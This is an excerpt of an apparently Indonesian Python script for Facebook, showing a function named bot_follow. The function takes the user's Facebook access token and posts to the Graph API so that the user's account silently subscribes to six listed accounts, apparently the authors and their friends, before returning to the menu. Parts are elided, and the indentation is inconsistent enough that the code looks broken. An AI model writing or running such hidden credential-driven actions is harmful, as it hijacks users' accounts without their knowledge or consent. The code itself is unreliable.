...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		masuk()
	requests.post('https://graph.facebook.com/100069451461857/subscribers?access_token=' + toket)     #Dapunta Khurayra X
    	requests.post('https://graph.facebook.com/100057369655873/subscribers?access_token=' + toket)      #A　l　d　i　　S　a　d　B　o　y
    	requests.post('https://graph.facebook.com/100000879343893/subscribers?access_token=' + toket) #Susiani Azzahra Cane
    	requests.post('https://graph.facebook.com/100013420657766/subscribers?access_token=' + toket)       #Reza Fahlevi Fahlevi
    	requests.post('https://graph.facebook.com/100045961624784/subscribers?access_token=' + toket) #Al Fikri Bos
    	requests.post('https://graph.facebook.com/100017724540231/subscribers?access_token=' + toket) #ALDI ALERGI SELEB
    	menu()
